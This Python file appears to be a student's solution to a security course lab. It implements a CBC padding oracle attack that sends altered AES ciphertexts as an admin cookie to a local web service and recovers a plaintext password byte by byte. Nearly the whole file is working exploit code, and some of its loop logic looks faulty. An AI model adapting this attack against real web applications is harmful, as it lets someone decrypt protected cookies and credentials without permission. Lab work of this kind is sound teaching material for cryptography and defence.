import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import algorithms


from requests import Session
from maul import do_login_form

import base64
import binascii


#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = algorithms.AES.block_size/8

    @property
    def block_length(self):
        return int(self._block_size_bytes)

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self, ct, sess):
        cookies = {"admin": ct}
        res  = sess.post(self.url, cookies=cookies).text
        if "Unspecified error" in res or "Bad padding for admin cookie!" in res:
            return True
        return False

def split_into_blocks(msg, l):
    l=int(l)
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx, sess):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0, c1 = list(split_into_blocks(ctx, po.block_length))
    msg = ''
    # TODO: Implement padding oracle attack for 2 blocks of messages.
    
    resolved = [0]*po.block_length
    
    # i from 1 to 16
    for i in range(1, po.block_length+1):
        
        # j from 15 to 0
        j = po.block_length-i
        
        # k from 1 to 255
        for k in range(po.block_length**2):
            bytes_arr = bytearray(c0[:j] + (k ^ c0[j]).to_bytes(1,'big'))
            bytes_arr += bytearray([i ^ v for v in resolved[j+1:]])
            mauled = bytes(bytes_arr)
            
            ct = (mauled+c1) if j > 0 else (b'\x00' * 16 + mauled + c1)
            if not po.test_ciphertext(ct.hex(), sess): # does not have padding error
                resolved[j] = k ^ c0[j] ^ i
                
    return ''.join([chr(j^i) for j,i in zip(c0,resolved)])

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    
    # TODO: Implement padding oracle attack for arbitrary length message.
    session = Session()
    assert(do_login_form(session, "attacker", "attacker"))

    return "".join([po_attack_2blocks(po, j+i, session) \
                    for j, i in zip(ctx_blocks[:-1], ctx_blocks[1:])])


if __name__ == "__main__":
    po = PaddingOracle("http://localhost:8080/setcoins")
    cipher = bytes.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
    
    # sess = Session()
    # print('Has padding error:', po.test_ciphertext(ct=cipher.hex(), sess=sess))

    plaintext = po_attack(po, cipher)
    print("Plaintext password: " + plaintext)